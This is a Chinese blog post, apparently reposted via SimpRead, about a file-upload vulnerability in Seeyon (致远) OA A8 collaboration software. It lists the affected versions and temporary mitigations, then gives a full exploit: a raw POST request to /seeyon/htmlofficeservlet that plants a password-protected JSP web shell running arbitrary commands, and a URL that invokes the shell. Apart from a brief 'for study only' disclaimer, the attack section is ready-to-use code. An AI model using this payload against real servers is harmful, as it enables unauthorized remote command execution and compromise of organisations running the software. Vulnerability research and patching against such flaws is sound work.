> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/Yang34/p/13601466.html)

### 最近正好有人问，于是乎翻翻笔记发一波

### 环境为本地复现学习！文章仅供学习交流使用！用于非法目的与本人无关！

### 漏洞影响

漏洞影响的产品版本包括：  
致远A8-V5协同管理软件 V6.1sp1  
致远A8+协同管理软件V7.0、V7.0sp1、V7.0sp2、V7.0sp3  
致远A8+协同管理软件V7.1

### 漏洞修补

临时修补方案如下：  
1、 配置URL访问控制策略；  
2、 在公网部署的致远A8+服务器，通过ACL禁止外网对“/seeyon/htmlofficeservlet”路径的访问；  
3、 对OA服务器上的网站后门文件进行及时查杀。  
建议使用致远OA-A8系统的信息系统运营者进行自查，发现存在漏洞后，按照以上方案及时修复。

### 利用姿势发送如下POST包

```
POST /seeyon/htmlofficeservlet HTTP/1.1
Host: XXX
Content-Length: 1251
 
 
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0
Pragma: no-cache
Content-Length: 1122
 
DBSTEP V3.0     355             0               666             DBSTEP=OKMLlKlV
OPTION=S3WYOSWLBSGr
currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66
CREATEDATE=wUghPB3szB3Xwg66
RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6
originalFileId=wV66
originalCreateDate=wUghPB3szB3Xwg66
FILENAME=qfTdqfTdqfTdVaxJeAJQBRl3dExQyYOdNAlfeaxsdGhiyYlTcATdN1liN4KXwiVGzfT2dEg6
needReadFile=yRWZdAS6
originalCreateDate=wLSGP4oEzLKAz4=iz=66
<%@ page language="java" import="java.util.*,java.io.*" pageEncoding="UTF-8"%><%!public static String excuteCmd(String c) {StringBuilder line = new StringBuilder();try {Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) {line.append(temp+"\n");}buf.close();} catch (Exception e) {line.append(e.getMessage());}return line.toString();} %><%@if("asasd3344".equals(request.getParameter("pwd"))&&!"".equals(request.getParameter("cmd"))){out.println("<pre>"+excuteCmd(request.getParameter("cmd")) + "</pre>");}else{out.println(":-)");}%>6e4f045d4b8506bf492ada7e3390d7ce 
```

### 浏览器访问即可getshell

[http://XXX/seeyon/test123456.jsp?pwd=asasd3344&cmd=whoami](http://XXX/seeyon/test123456.jsp?pwd=asasd3344&cmd=whoami)

### 截图

![](https://img2020.cnblogs.com/blog/1590180/202009/1590180-20200902141937963-203702836.png)